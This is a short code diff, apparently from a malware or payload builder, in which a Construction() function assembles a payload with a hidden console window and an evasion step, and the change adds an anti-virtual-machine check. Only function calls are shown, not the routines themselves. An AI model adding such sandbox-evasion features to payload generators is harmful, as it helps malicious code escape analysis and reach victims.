@@ -29,6 +29,7 @@ def Construction():
         Final_Code = body.Start()
         Final_Code += str(PAYLOAD)
         Final_Code += body.Hide_Window_Console()
+        Final_Code += evasion.Anti_VM(FILENAME)
         Final_Code += evasion.Decoil()
         Final_Code += body.End()
 
